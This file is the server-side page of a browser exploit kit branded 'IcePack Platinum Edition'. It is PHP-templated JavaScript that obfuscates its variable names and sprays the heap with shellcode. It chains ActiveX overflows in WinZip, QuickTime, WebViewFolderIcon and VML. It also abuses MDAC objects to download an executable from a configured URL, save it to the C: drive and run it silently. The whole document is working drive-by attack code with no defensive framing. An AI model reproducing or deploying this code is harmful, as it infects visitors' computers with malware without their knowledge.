<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

$mdac_clsid = "'{BD96C556-65A3-11D0-983A-00C04FC29E30}', '{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', '{0006F033-0000-0000-C000-000000000046}', '{0006F03A-0000-0000-C000-000000000046}', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}', '{6414512B-B978-451D-A0D8-FCFDF33E833C}', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}', '{639F725F-1B2D-4831-A9FD-874847682010}', '{BA018599-1DB3-44f9-83B4-461454C84BF8}', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}'";
$vml_obj_clsid = 'CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E';
?>

<html xmlns:v="urn:schemas-microsoft-com:vml">

<head>
<object id="VMLRender" classid="<?=$vml_obj_clsid;?>">
</object>
<style>
v\:* { behavior: url(#VMLRender); }
</style>
</head>

<body><div id="myDivA"></div>
	
<script language="JavaScript">
	<?
	/*
	|| Common Functions
	*/
	?>
	
	function <?=$var[15];?>(<?=$var[17];?>, <?=$var[16];?>)
	{
		while (<?=$var[17];?>.length*2<<?=$var[16];?>)
		<?=$var[17];?> += <?=$var[17];?>;
		<?=$var[17];?> = <?=$var[17];?>.substring(0,<?=$var[16];?>/2);
		return <?=$var[17];?>;
	}
	
	function <?=$var[18];?>()
	{
		var <?=$var[19];?> = 0x0c0c0c0c;
		var <?=$var[20];?> = unescape("<?=$ShellCode?>");
		var <?=$var[21];?> = 0x400000;
		var <?=$var[22];?> = <?=$var[20];?>.length * 2;
		var <?=$var[16];?> = <?=$var[21];?> - (<?=$var[22];?>+0x38);
		var <?=$var[17];?> = unescape("%u0c0c%u0c0c");
		
		<?=$var[17];?> = <?=$var[15];?>(<?=$var[17];?>,<?=$var[16];?>);
		<?=$var[23];?> = (<?=$var[19];?> - 0x400000)/<?=$var[21];?>;
		<?=$var[24];?> = new Array();
		for(i=0;i<<?=$var[23];?>;i++) <?=$var[24];?>[i] = <?=$var[17];?> + <?=$var[20];?>;
	}
	
	function Attack(n)
	{
		if (n == 0)
		{
		  <?
			/*
			|| WinZip Overflow
			*/
			?>
			
			try
			{
				var WZObject = document.createElement("object");
				WZObject.setAttribute("classid","CLSID:A09AE68F-B14D-43ED-B713-BA413F034904");
				var check = WZObject.CreateNewFolderName(unescape("%00"));
				
				if (check == false)
				{
					<?=$var[18];?>();
					
					var ch = 'A';
					while (xh.length < 231) ch+='A';
					ch += "\x0c\x0c\x0c\x0c\x0c\x0c\x0c";
					WZObject.CreateNewFolderFromName(ch);
					n = 200;
				}
			} catch(e){}
				
		if (n = 200) setTimeout("Attack(1)", 1000); else Attack(1);
		} else
			
		if (n == 1)
		{
		    <?
			/*
			|| QuickTime Overflow
			*/
			?>
			
			try
			{
				QTObject = new ActiveXObject('QuickTime.QuickTime');
				
				if (QTObject)
				{
					var qtcode = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+
					'<param name="src" value="<?=$dl_path?>?qt=1">'+
					'<param name="autoplay" value="true">'+
					'<param name="loop" value="false">'+
					'<param name="controller" value="true">'+
					'</object>';
					
					<?=$var[18];?>();
					document.getElementById("myDivA").innerHTML = qtcode;
					n = 200;					
				}
				
			} catch(e){}
				
		if (n = 200) setTimeout("Attack(2)", 1000); else Attack(2);
		} else			
		
		if (n == 2)
		{
		    <?
			/*
			|| WVF Overflow
			*/
			?>
			
			check = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
			
			if (check)
			{
				<?=$var[18];?>();
				
				for(i=0;i<128;i++)
				{
					try
					{
						var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
						_x = 0x7ffffffe; _y = 0x0c0c0c0c;
						tar.setSlice(_x,_y,_y,_y);
						n = 200
					} catch(e){}
				}
			}
			if (n = 200) setTimeout("Attack(3)", 1000); else Attack(3);
		} else
			
		if (n == 3)
		{
		    <?
			/*
			|| VML Overflow
			*/
			?>
			
			<?=$var[18];?>();
			
			myDiv = document.getElementById("myDivA");
			
			exploit  = "<v:rect style='width:120pt;height:80pt' fillcolor=\"red\" >";
			exploit += "<v:recolorinfo recolorstate=\"t\" numcolors=\"97612895\">";
			for (i=0;i<44;i++) exploit += "<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\ lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\" fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/> " ;
			exploit += "<v/recolorinfo>";
			myDiv.innerHTML = exploit;
		}		
	}
	<?
	/*
	|| MDAC Overflow
	*/
	?>
		
	function <?=$var[1];?>(<?=$var[7];?>)
	{
		var <?=$var[2];?> = "abcdefghiklmnopqrstuvwxyz";
		var <?=$var[3];?> = <?=$var[7];?>;
		var <?=$var[4];?> = '';
		for (var i=0; i<<?=$var[3];?>; i++)
		{
			var <?=$var[5];?> = Math.floor(Math.random() * <?=$var[2];?>.length);
			<?=$var[4];?> += <?=$var[2];?>.substring(<?=$var[5];?>,<?=$var[5];?>+1);
		}
		return <?=$var[4];?>;
	}
	
	function <?=$var[6];?>(CLSID, name)
	{
		var result = null;
		
		                try { eval('result = CLSID.CreateObject(name)') }         catch(e){}
		if (! result) { try { eval('result = CLSID.CreateObject(name, "")') }     catch(e){} }
		if (! result) { try { eval('result = CLSID.CreateObject(name, "", "")') } catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject("", name)') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name, "")') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name)') }            catch(e){} }
		
		return(result);
	}
	
	function <?=$var[8];?>(xml, url)
	{
		try
		{
			xml.open("GET", url, false);
			xml.send(null);
		} catch(e) { return 0; }
			
		return xml.responseBody;
	}
	
	function <?=$var[9];?>(o, name, data)
	{
		try
		{
			o.Type = 1;
			o.Mode = 3;
			o.Open();
			o.Write(data);
			o.SaveToFile(name, 2);
			o.Close();
		} catch(e) { return 0; }
		return 1;
	}
	
	function <?=$var[10];?>(exec, name, type)
	{
		if (type == 0)
		{
			try { exec.Run(name, 0); return 1; } catch(e) { }
		}
		else
		{
			try { exe.<?=$var[10];?>(name); return 1; } catch(e) { }
		}
		return(0);
	}
	
	function MDAC()
	{
		var <?=$var[11];?> = "<?=$dl_path;?>";
		var <?=$var[12];?> = new Array(<?=$mdac_clsid;?>, null);
		var <?=$var[13];?> = new Array(null, null, null);
		var i = 0;
		var n = 0;
		var ret = 0;
		
		while (<?=$var[12];?>[i] && (! <?=$var[13];?>[0] || ! <?=$var[13];?>[1] || ! <?=$var[13];?>[2]) )
		{
			var a = null;
			
			try
			{
				a = document.createElement("object");
				a.setAttribute("classid", "clsid:" + <?=$var[12];?>[i].substring(1, <?=$var[12];?>[i].length - 1));
			} catch(e) { a = null; }
				
			if (a)
			{
				if (! <?=$var[13];?>[0])
				{
					<?=$var[13];?>[0] = <?=$var[6];?>(a, "ms"+"xml2.XM"+"LHTTP");
					if (! <?=$var[13];?>[0]) <?=$var[13];?>[0] = <?=$var[6];?>(a, "Micr"+"osoft.X"+"MLHTTP");
					if (! <?=$var[13];?>[0]) <?=$var[13];?>[0] = <?=$var[6];?>(a, "MSX"+"ML2.Serv"+"erXML"+"HTTP");
				}
				if (! <?=$var[13];?>[1])
				{
					<?=$var[13];?>[1] = <?=$var[6];?>(a, "ADO"+"DB.St"+"ream");
				}
				if (! <?=$var[13];?>[2])
				{
					<?=$var[13];?>[2] = <?=$var[6];?>(a, "WSc"+"ript.Sh"+"ell");
					if (! <?=$var[13];?>[2])
					{
						<?=$var[13];?>[2] = <?=$var[6];?>(a, "Sh"+"ell.Appli"+"cation");
						if (<?=$var[13];?>[2]) n=1;
					}
				}
			}
			i++;
		}
		if (<?=$var[13];?>[0] && <?=$var[13];?>[1] && <?=$var[13];?>[2])
		{
			var data = <?=$var[8];?>(<?=$var[13];?>[0], <?=$var[11];?>);
			
			if (data != 0)
			{
				var name = "c:\\"+<?=$var[1];?>(4)+".exe";
				if (<?=$var[9];?>(<?=$var[13];?>[1], name, data) == 1)
				{
					if (<?=$var[10];?>(<?=$var[13];?>[2], name, n) == 1) { ret=1; }
				}
			}
		}
		return ret;
	}
	<?
	/*
	0 - WinZip
	1 - QuickTime
	2 - WVF
	3 - VML
	*/
	?>
	
	if (!MDAC()) Attack(0);

</script>

</body>
</html>